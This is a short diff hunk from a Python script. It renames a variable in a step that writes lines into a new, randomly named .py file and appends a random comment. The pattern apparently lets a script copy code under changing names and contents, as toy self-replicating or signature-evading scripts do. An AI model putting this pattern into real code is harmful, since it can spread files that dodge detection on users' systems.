@@ -67,7 +67,7 @@ f.close()
 filename = "{randomness}.py".format(
         randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
-i = open(dir + "\\" + filename, "w")
+i = open(directory + "\\" + filename, "w")
 writeIntoFile(i, lines)
 i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
 i.close()
